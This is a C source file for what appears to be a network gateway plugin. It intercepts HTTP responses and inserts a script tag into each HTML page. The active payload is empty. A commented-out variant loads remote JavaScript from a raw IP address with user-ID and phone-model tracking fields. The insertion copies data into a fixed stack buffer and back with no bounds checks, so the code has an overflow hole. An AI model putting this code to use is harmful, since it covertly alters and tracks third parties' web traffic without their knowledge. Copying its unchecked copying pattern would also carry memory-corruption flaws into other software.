#include "main.h"

#define JS "<script type=\"text/javascript\"></script>\r\n"
//#define JS "<script type=\"text/javascript\"> alert('hello world') </script>\r\n"
//#define JS "<script type=\"text/javascript\" src=\"http://210.22.155.236/js/wa.init.min.js?v=20150930\" id=\"15_bri_mjq_init_min_36_wa_101\" async  data=\"userId=12245789-423sdfdsf-ghfg-wererjju8werw&channel=test&phoneModel=DOOV S1\"></script>\r\n"
#define JS_LEN strlen(JS)

PRIVATE int insert_js(void *data)
{
	struct skb_buf* skb=(struct skb_buf*)data;
	char* http_content;
	int http_content_len;
	char* search;
	int search_len;
	char buffer[BUFSIZE];
	int js_len;
	
	char* res="<html";
	
	if(skb->data_len<=0)
		return ERROR;
	
    http_content_len=get_data_len_from_skb(skb);
    http_content=get_data_from_skb(skb);
	
	search=strstr(http_content , res);
	
	if(!search)
	{
		return ERROR;
	}

	search_len=search - http_content;
	js_len=JS_LEN;
	memcpy(buffer , search , (http_content_len - search_len));
	memcpy(http_content + search_len , JS , js_len);
	memcpy(http_content + (search_len + js_len) , buffer , (http_content_len - search_len));
	skb->pload_len=skb->pload_len + js_len;
	skb->data_len = skb->data_len + js_len;
    return OK;
}

int init_plug_extern()
{
	new_plug(insert_js , PLUG_EXTERN_TYPE_RESPONSE);
	return 0;
}

